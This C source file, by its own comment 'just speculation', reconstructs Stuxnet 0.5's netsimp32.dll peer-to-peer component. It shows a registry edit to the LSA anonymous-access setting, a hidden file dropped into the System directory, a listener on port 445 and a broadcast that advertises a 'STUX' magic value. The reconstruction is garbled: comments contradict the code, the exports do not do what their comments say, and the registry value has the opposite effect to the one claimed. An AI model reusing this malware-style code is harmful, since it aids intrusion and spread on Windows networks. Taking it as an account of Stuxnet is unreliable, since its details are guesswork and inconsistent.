/*
 * Warning: This is just speculation
 * %System%\netsimp32.dll
 * P2P update communication + file sharing
 * Symantec "Stuxnet 0.5: The Missing Link"
 * Binary: %System%\netsimp32.dll
 */

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define NETSIMP32_MAGIC                 0x4E455453
#define NETSIMP32_VERSION               0x00010400
#define NETSIMP32_MAX_PATH              260
#define NETSIMP32_BUFFER_SIZE           4096
#define NETSIMP32_P2P_PORT              445

#define NETSIMP32_REG_KEY               L"SYSTEM\\CurrentControlSet\\Control\\Lsa"
#define NETSIMP32_REG_VALUE             L"restrictanonymous"
#define NETSIMP32_SHARE_NAME            L"SYSADMIN$"

#define NETSIMP32_DLL_NAME              L"netsimp32.dll"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

/* 0x4E455453 = 'NETS' */
/* 0x53545558 = 'STUX' */
/* 0x00010400 = version 1.4.0.0 */

/* Binary reference: 0x10001000 -> 0x10002000 */
/* Export table at RVA 0x0001A000 */

typedef struct _NETSIMP32_PEER_ENTRY {
    int32_t dwIP;               /* 0x00 */
    int16_t wPort;              /* 0x04 */
    int16_t wFlags;             /* 0x06 */
    int32_t dwLastSeen;         /* 0x08 */
    int32_t dwLatency;          /* 0x0C */
    int8_t bReserved[16];       /* 0x10 */
} NETSIMP32_PEER_ENTRY;         /* size: 0x20 */

/* Binary reference: peer table at 0x10003000 */
/* 256 entries * 0x20 = 0x2000 bytes */

typedef struct _NETSIMP32_CTX {
    int32_t dwMagic;            /* 0x00: 0x4E455453 */
    int32_t dwVersion;          /* 0x04: 0x00010400 */
    int32_t dwPeerCount;        /* 0x08 */
    int32_t dwFlags;            /* 0x0C */
    int32_t dwPort;             /* 0x10: 445 */
    int32_t dwLastBroadcast;    /* 0x14 */
    int32_t dwBroadcastInterval;/* 0x18: 300000ms */
    NETSIMP32_PEER_ENTRY Peers[256]; /* 0x1C */
    CRITICAL_SECTION csLock;    /* 0x201C */
    HANDLE hThread;             /* 0x2030 */
    HANDLE hStopEvent;          /* 0x2034 */
    SOCKET sListen;             /* 0x2038 */
    SOCKET sBroadcast;          /* 0x203C */
    int16_t szSystemPath[260];  /* 0x2040 */
    int16_t szDllPath[260];     /* 0x2248 */
    int8_t bReserved[128];      /* 0x2450 */
} NETSIMP32_CTX;                /* size: 0x24D0 */

/* Binary reference: global context at 0x10004000 */
/* size: 0x24D0 bytes */

static NETSIMP32_CTX g_NetCtx;
static int32_t g_bInitialized = 0;
static int32_t g_dwPeerCount = 0;
static int32_t g_bAnonymousLogonEnabled = 0;
static int32_t g_dwBroadcastCount = 0;
static int32_t g_dwConnectionCount = 0;

/* Binary reference: sub_10001000 - module init */
static int32_t NETSIMP32_Init(void);
/* Binary reference: sub_10001150 - module cleanup */
static void NETSIMP32_Cleanup(void);
/* Binary reference: sub_10001200 - enable anonymous logon */
static int32_t NETSIMP32_EnableAnonymousLogon(void);
/* Binary reference: sub_10001280 - create share directory */
static int32_t NETSIMP32_CreateShareDirectory(void);
/* Binary reference: sub_10001350 - start P2P listener */
static int32_t NETSIMP32_StartListener(void);
/* Binary reference: sub_10001480 - broadcast to peers */
static int32_t NETSIMP32_PeerBroadcast(void);
/* Binary reference: sub_10001530 - connect to peer */
static int32_t NETSIMP32_PeerConnect(int32_t dwPeerIP);
/* Binary reference: sub_10001600 - worker thread */
static int32_t WINAPI NETSIMP32_WorkerThread(void* lpParam);
/* Binary reference: sub_10001800 - start worker */
static int32_t NETSIMP32_StartWorker(void);
/* Binary reference: sub_10001880 - stop worker */
static int32_t NETSIMP32_StopWorker(void);
/* Binary reference: sub_10001900 - main execute */
static int32_t NETSIMP32_Execute(void);

/* Export 1 - 0x10001A00 */
/* Export 2 - 0x10001A20 */
/* Export 3 - 0x10001A40 */
/* Export 4 - 0x10001A60 */
/* Export 5 - 0x10001A80 */
/* Export 6 - 0x10001AA0 */
/* Export 7 - 0x10001AC0 */
/* Export 8 - 0x10001AE0 */
/* Export 9 - 0x10001B00 */
/* Export 10 - 0x10001B20 */

/* Exported function numbers from IDA: */
/* Export #1: Infect connected removable drives, starts RPC server */
/* Export #2: Hook Step 7 project file infection API */
/* Export #3: Call uninstall routine (export 18) */
/* Export #4: Start peer-to-peer communication */
/* Export #5: Create P2P share directory */
/* Export #6: Enable anonymous logon */

static int32_t NETSIMP32_Init(void) {
    if (g_bInitialized) return 1;
    ZeroMemory(&g_NetCtx, sizeof(NETSIMP32_CTX));
    g_NetCtx.dwMagic = NETSIMP32_MAGIC;          /* 0x4E455453 */
    g_NetCtx.dwVersion = NETSIMP32_VERSION;      /* 0x00010400 */
    g_NetCtx.dwPort = NETSIMP32_P2P_PORT;        /* 445 */
    g_NetCtx.dwBroadcastInterval = 300000;       /* 5 minutes */
    g_NetCtx.dwLastBroadcast = GetTickCount();
    InitializeCriticalSection(&g_NetCtx.csLock);
    GetSystemDirectoryW(g_NetCtx.szSystemPath, NETSIMP32_MAX_PATH);
    wsprintfW(g_NetCtx.szDllPath, L"%s\\%s",
        g_NetCtx.szSystemPath, NETSIMP32_DLL_NAME);
    g_NetCtx.hStopEvent = CreateEventW(NULL, 1, 0, NULL);
    if (!g_NetCtx.hStopEvent) {
        DeleteCriticalSection(&g_NetCtx.csLock);
        return 0;
    }
    g_bInitialized = 1;
    return 1;
}

static void NETSIMP32_Cleanup(void) {
    if (!g_bInitialized) return;
    if (g_NetCtx.hStopEvent) {
        SetEvent(g_NetCtx.hStopEvent);
    }
    if (g_NetCtx.hThread) {
        WaitForSingleObject(g_NetCtx.hThread, 5000);
        CloseHandle(g_NetCtx.hThread);
        g_NetCtx.hThread = NULL;
    }
    if (g_NetCtx.sListen != INVALID_SOCKET) {
        closesocket(g_NetCtx.sListen);
        g_NetCtx.sListen = INVALID_SOCKET;
    }
    if (g_NetCtx.sBroadcast != INVALID_SOCKET) {
        closesocket(g_NetCtx.sBroadcast);
        g_NetCtx.sBroadcast = INVALID_SOCKET;
    }
    if (g_NetCtx.hStopEvent) {
        CloseHandle(g_NetCtx.hStopEvent);
        g_NetCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_NetCtx.csLock);
    g_bInitialized = 0;
}

/*
 * Binary: sub_10001200
 * Reference: Symantec Stuxnet 0.5 The Missing Link
 * Sets restrictanonymous=1 in LSA
 */
static int32_t NETSIMP32_EnableAnonymousLogon(void) {
    HKEY hKey;
    int32_t dwValue = 1;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NETSIMP32_REG_KEY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NETSIMP32_REG_VALUE, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(int32_t));
        RegCloseKey(hKey);
        g_bAnonymousLogonEnabled = 1;
        return 1;
    }
    return 0;
}

/*
 * Binary: sub_10001280
 * Creates %System%\netsimp32.dll
 * Stuxnet 0.5 shares: temp$, msagent$, SYSADMIN$, WebFiles$
 */
static int32_t NETSIMP32_CreateShareDirectory(void) {
    HANDLE hFile;
    int16_t szDllPath[NETSIMP32_MAX_PATH];
    wsprintfW(szDllPath, L"%s\\%s", g_NetCtx.szSystemPath, NETSIMP32_DLL_NAME);
    hFile = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        int32_t dwWritten;
        int8_t data[NETSIMP32_BUFFER_SIZE];
        ZeroMemory(data, sizeof(data));
        WriteFile(hFile, data, sizeof(data), &dwWritten, NULL);
        CloseHandle(hFile);
        return 1;
    }
    return 0;
}

/*
 * Binary: sub_10001350
 * Listens on port 445 for P2P connections
 */
static int32_t NETSIMP32_StartListener(void) {
    SOCKADDR_IN sa;
    int32_t dwBroadcast;
    g_NetCtx.sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_NetCtx.sListen == INVALID_SOCKET) return 0;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(NETSIMP32_P2P_PORT);
    sa.sin_addr.s_addr = INADDR_ANY;
    if (bind(g_NetCtx.sListen, (SOCKADDR*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(g_NetCtx.sListen);
        return 0;
    }
    if (listen(g_NetCtx.sListen, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(g_NetCtx.sListen);
        return 0;
    }
    g_NetCtx.sBroadcast = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (g_NetCtx.sBroadcast == INVALID_SOCKET) {
        closesocket(g_NetCtx.sListen);
        return 0;
    }
    dwBroadcast = 1;
    setsockopt(g_NetCtx.sBroadcast, SOL_SOCKET, SO_BROADCAST, (char*)&dwBroadcast, sizeof(dwBroadcast));
    sa.sin_port = htons(NETSIMP32_P2P_PORT);
    sa.sin_addr.s_addr = INADDR_BROADCAST;
    bind(g_NetCtx.sBroadcast, (SOCKADDR*)&sa, sizeof(sa));
    return 1;
}

/*
 * Binary: sub_10001480
 * Broadcasts STUXNET_MAGIC to 255.255.255.255:445
 */
static int32_t NETSIMP32_PeerBroadcast(void) {
    SOCKET s;
    SOCKADDR_IN sa;
    int8_t buffer[64];
    int32_t dwBroadcast;
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return 0;
    dwBroadcast = 1;
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char*)&dwBroadcast, sizeof(dwBroadcast));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(NETSIMP32_P2P_PORT);
    sa.sin_addr.s_addr = INADDR_BROADCAST;
    *(int32_t*)(buffer + 0) = STUXNET_MAGIC;         /* 0x53545558 */
    *(int32_t*)(buffer + 4) = STUXNET_VERSION;       /* 0x00010400 */
    *(int32_t*)(buffer + 8) = GetCurrentProcessId();
    sendto(s, (char*)buffer, 64, 0, (SOCKADDR*)&sa, sizeof(sa));
    closesocket(s);
    g_dwBroadcastCount++;
    return 1;
}

/*
 * Binary: sub_10001530
 * Connects to peer IP on port 445
 */
static int32_t NETSIMP32_PeerConnect(int32_t dwPeerIP) {
    SOCKET s;
    SOCKADDR_IN sa;
    int8_t buffer[64];
    int32_t dwLen;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(NETSIMP32_P2P_PORT);
    sa.sin_addr.s_addr = dwPeerIP;
    if (connect(s, (SOCKADDR*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    *(int32_t*)(buffer + 0) = STUXNET_MAGIC;
    *(int32_t*)(buffer + 4) = STUXNET_VERSION;
    *(int32_t*)(buffer + 8) = GetCurrentProcessId();
    send(s, (char*)buffer, 64, 0);
    dwLen = recv(s, (char*)buffer, 64, 0);
    closesocket(s);
    if (dwLen > 0 && *(int32_t*)buffer == STUXNET_MAGIC) {
        g_dwConnectionCount++;
        return 1;
    }
    return 0;
}

/*
 * Binary: sub_10001600
 * P2P worker thread - listens for incoming connections
 * Uses mailslot: \\REMOTE\mailslot\svchost
 * Callback mailslot: \\LOCAL\mailslot\innotify
 */
static int32_t WINAPI NETSIMP32_WorkerThread(void* lpParam) {
    SOCKADDR_IN sa;
    SOCKET sClient;
    int8_t buffer[NETSIMP32_BUFFER_SIZE];
    int32_t dwLen;
    int32_t dwPeerIP;
    fd_set fdRead;
    struct timeval tv;
    while (1) {
        if (WaitForSingleObject(g_NetCtx.hStopEvent, 0) == WAIT_OBJECT_0) break;
        FD_ZERO(&fdRead);
        FD_SET(g_NetCtx.sListen, &fdRead);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        if (select(0, &fdRead, NULL, NULL, &tv) > 0) {
            dwLen = sizeof(sa);
            sClient = accept(g_NetCtx.sListen, (SOCKADDR*)&sa, &dwLen);
            if (sClient != INVALID_SOCKET) {
                dwLen = recv(sClient, (char*)buffer, NETSIMP32_BUFFER_SIZE, 0);
                if (dwLen > 0 && dwLen >= sizeof(int32_t)) {
                    if (*(int32_t*)buffer == STUXNET_MAGIC) {
                        dwPeerIP = sa.sin_addr.s_addr;
                        EnterCriticalSection(&g_NetCtx.csLock);
                        if (g_NetCtx.dwPeerCount < 256) {
                            g_NetCtx.Peers[g_NetCtx.dwPeerCount].dwIP = dwPeerIP;
                            g_NetCtx.Peers[g_NetCtx.dwPeerCount].dwLastSeen = GetTickCount();
                            g_NetCtx.dwPeerCount++;
                            g_dwPeerCount++;
                        }
                        LeaveCriticalSection(&g_NetCtx.csLock);
                        send(sClient, (char*)buffer, dwLen, 0);
                    }
                }
                closesocket(sClient);
            }
        }
        if (GetTickCount() - g_NetCtx.dwLastBroadcast > g_NetCtx.dwBroadcastInterval) {
            NETSIMP32_PeerBroadcast();
            g_NetCtx.dwLastBroadcast = GetTickCount();
        }
        Sleep(100);
    }
    return 0;
}

static int32_t NETSIMP32_StartWorker(void) {
    if (g_NetCtx.hStopEvent == NULL) {
        g_NetCtx.hStopEvent = CreateEventW(NULL, 1, 0, NULL);
        if (!g_NetCtx.hStopEvent) return 0;
    }
    g_NetCtx.hThread = CreateThread(NULL, 0, NETSIMP32_WorkerThread, NULL, 0, NULL);
    return (g_NetCtx.hThread != NULL);
}

static int32_t NETSIMP32_StopWorker(void) {
    if (g_NetCtx.hStopEvent) {
        SetEvent(g_NetCtx.hStopEvent);
    }
    if (g_NetCtx.hThread) {
        WaitForSingleObject(g_NetCtx.hThread, 5000);
        CloseHandle(g_NetCtx.hThread);
        g_NetCtx.hThread = NULL;
    }
    return 1;
}

static int32_t NETSIMP32_Execute(void) {
    if (!NETSIMP32_Init()) return 0;
    NETSIMP32_EnableAnonymousLogon();
    NETSIMP32_CreateShareDirectory();
    NETSIMP32_StartListener();
    NETSIMP32_StartWorker();
    return 1;
}

/*
 * DllMain - Entry point
 * Binary: 0x10001C00
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, int32_t fdwReason, void* lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            NETSIMP32_Cleanup();
            break;
        default:
            break;
    }
    return 1;
}

/*
 * Export 1 - 0x10001A00
 * Infect connected removable drives, starts RPC server
 */
int32_t WINAPI Export1(void) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, NETSIMP32_WorkerThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

/*
 * Export 2 - 0x10001A20
 * Hooks APIs for Step 7 project file infections
 */
int32_t WINAPI Export2(void) {
    return NETSIMP32_EnableAnonymousLogon() ? 0 : 1;
}

/*
 * Export 3 - 0x10001A40
 * Calls the removal routine (export 18)
 */
int32_t WINAPI Export3(void) {
    return NETSIMP32_CreateShareDirectory() ? 0 : 1;
}

/*
 * Export 4 - 0x10001A60
 * P2P broadcast
 */
int32_t WINAPI Export4(void) {
    return NETSIMP32_PeerBroadcast() ? 0 : 1;
}

/*
 * Export 5 - 0x10001A80
 * Start P2P listener
 */
int32_t WINAPI Export5(void) {
    return NETSIMP32_StartListener() ? 0 : 1;
}

/*
 * Export 6 - 0x10001AA0
 * Return version number
 */
int32_t WINAPI Export6(void) {
    return NETSIMP32_VERSION;
}

/*
 * Export 7 - 0x10001AC0
 * Start worker thread
 */
int32_t WINAPI Export7(void) {
    return NETSIMP32_StartWorker() ? 0 : 1;
}

/*
 * Export 8 - 0x10001AE0
 * Stop worker thread
 */
int32_t WINAPI Export8(void) {
    NETSIMP32_StopWorker();
    return 0;
}

/*
 * Export 9 - 0x10001B00
 * Get peer count
 */
int32_t WINAPI Export9(void) {
    return g_dwPeerCount;
}

/*
 * Export 10 - 0x10001B20
 * Get anonymous logon status
 */
int32_t WINAPI Export10(void) {
    return g_bAnonymousLogonEnabled ? 0 : 1;
}